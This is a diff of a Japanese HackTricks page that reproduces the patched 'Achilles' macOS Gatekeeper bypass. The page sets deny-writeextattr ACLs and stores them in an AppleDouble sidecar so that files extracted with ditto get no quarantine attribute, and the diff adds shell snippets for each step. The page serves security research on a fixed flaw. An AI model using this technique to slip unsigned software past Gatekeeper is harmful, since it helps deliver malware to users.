@@ -1,12 +1,71 @@
-# macOS xattr-acls の補足情報
+# AppleDouble ACL Quarantine Bypass の再現
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-この歴史的な proof of concept は、Achilles Gatekeeper bypass の調査で使われた AppleDouble/ACL 手法を再現します。ACL をシリアライズして AppleDouble sidecar に保存し、属性名を `com.apple.acl.text` に変更して、ZIP を再パックします。<sup>[[1]](#references)[[2]](#references)</sup>
+この歴史的な proof of concept は、Achilles Gatekeeper bypass の研究で使われた AppleDouble/ACL 手法を再現します。ACL をシリアライズして AppleDouble サイドカーに保存し、属性名を `com.apple.acl.text` に変更して、ZIP を再パッケージします。<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple は macOS Ventura 13、Monterey 12.6.2、Big Sur 11.7.2 で Gatekeeper bypass を修正しました。現在の Mac で ACL を復元しても、Gatekeeper bypass が機能することの実証にはなりません。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple は macOS Ventura 13、Monterey 12.6.2、Big Sur 11.7.2 で Gatekeeper bypass を修正しました。現在の Mac で ACL を復元しても、Gatekeeper bypass が機能することの証明にはなりません。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 quarantine と初回起動時のチェックについては、[macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses) を参照してください。
+
+## ACL と AppleDouble のファイルシステム動作
+
+### writeextattr ACL
+
+この ACL は、ファイルへの `xattrs` の追加を防ぎます。
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+**AppleDouble** ファイル形式では、ACEを含むファイルのコピーが作成されます。
+
+[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)を見ると、**`com.apple.acl.text`** という名前のxattrに保存されたACLのテキスト表現が、展開後のファイルのACLとして設定されることがわかります。そのため、ほかのxattrが書き込まれないようにするACLを設定して、アプリケーションを**AppleDouble**形式のzipファイルに圧縮すると、アプリケーションにquarantine xattrが設定されません。
+
+詳細については、[**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を確認してください。<sup>[[1]](#references)</sup>
+
+これを再現するには、まず正しいACL文字列を取得する必要があります。
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+（これが機能する場合でも、sandboxは事前にquarantine xattrを書き込みます）
+
+## AppleDoubleサイドカーの構築と検証
 
 ```bash
 rm -rf /tmp/test*
@@ -77,7 +136,7 @@ echo something > start/protected/something
 
 <details>
 
-<summary>set_xattr のコード</summary>
+<summary>set_xattrのコード</summary>
 
 ```c
 // gcc -o set_xattr set_xattr.c
@@ -191,8 +250,8 @@ xattr -p com.apple.quarantine protected
 
 ## References
 
-- [1] [Microsoft Security Blog — Gatekeeperのアキレス腱：macOSの脆弱性を発掘](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
-- [2] [Apple Developer — `ditto`を使用したMacソフトウェアの配布用パッケージ化](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
+- [1] [Microsoft Security Blog — Gatekeeperのアキレス腱：macOSの脆弱性を発見](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [2] [Apple Developer — `ditto`を使った配布用Macソフトウェアのパッケージ化](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
 - [3] [Apple Support — macOS Ventura 13のセキュリティコンテンツについて](https://support.apple.com/en-ae/102853)
 - [4] [Apple Support — macOS Monterey 12.6.2のセキュリティコンテンツについて](https://support.apple.com/en-ae/102806)
 - [5] [Apple Support — macOS Big Sur 11.7.2のセキュリティコンテンツについて](https://support.apple.com/en-us/102785)
